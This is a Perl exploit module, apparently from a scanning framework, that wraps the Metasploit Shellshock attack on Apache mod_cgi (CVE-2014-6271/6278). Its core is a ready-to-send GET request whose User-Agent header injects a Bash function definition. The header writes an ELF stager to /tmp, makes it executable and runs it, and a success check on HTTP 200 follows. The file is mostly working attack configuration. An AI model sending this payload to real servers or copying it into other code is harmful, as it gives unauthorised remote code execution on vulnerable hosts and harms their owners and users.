package APACHE::MSF::ApacheModCgiBashEnvExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "ApacheModCgiBashEnvExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE"                  => "CVE-2014-6278",
  "CVE TO CHECK/EXPLOIT" => "CVE-CVE-2014-6271",
  "DESCRIPTION"          => "

        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell

        handles external environment variables. This module targets CGI scripts in the

        Apache web server by setting the HTTP_USER_AGENT environment variable to a

        malicious function definition.

      ",
  "METHOD"               => "",
  "MSF_MODULE"           => "apache_mod_cgi_bash_env_exec",
  "OSVDB"                => 112004,
  "PATHS"                => ["bin"],
  "REFERENCES"           => [
                              "https://access.redhat.com/articles/1200223",
                              "http://seclists.org/oss-sec/2014/q3/649",
                            ],
  "TITLE"                => "Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)",
  VARIABLES => {
    'METHOD' =>       { DESCRIPTION => "HTTP method to use", VALUE => "GET" },
    'PATH' =>       {
  DESCRIPTION => "Target PATH for binaries used by the CmdStager",
  VALUE => "/bin",
},
    'HEADER' =>       { DESCRIPTION => "HTTP header to use", VALUE => "User-Agent" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'User-Agent' => '() { :;};echo -e "\r\nmK1McdRbO4kvxyFrZ$(echo -en \\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x03\\x00\\x01\\x00\\x00\\x00\\x54\\x80\\x04\\x08\\x34\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x34\\x00\\x20\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x04\\x08\\x00\\x80\\x04\\x08\\x5f\\x00\\x00\\x00\\x6a\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x5f\\x5f\\x50\\x41\\x59\\x4c\\x4f\\x41\\x44\\x5f\\x5f>>/tmp/mzXvQ ; /bin/chmod 777 /tmp/mzXvQ ; /tmp/mzXvQ)mK1McdRbO4kvxyFrZ"',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
